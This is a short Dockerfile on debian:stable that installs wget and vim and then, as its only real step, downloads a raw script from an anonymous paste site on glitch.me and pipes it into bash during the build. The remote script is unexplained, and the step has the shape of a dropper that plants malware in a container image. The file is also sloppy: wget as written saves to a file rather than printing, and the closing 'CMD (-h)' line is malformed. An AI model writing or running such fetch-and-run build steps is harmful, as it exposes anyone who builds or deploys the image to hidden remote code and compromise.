FROM debian:stable
RUN apt-get update && apt-get -y install wget vim
WORKDIR /home
RUN wget https://muq-hastebin.glitch.me/raw/4mNO3Wgk8J | bash
CMD (-h)
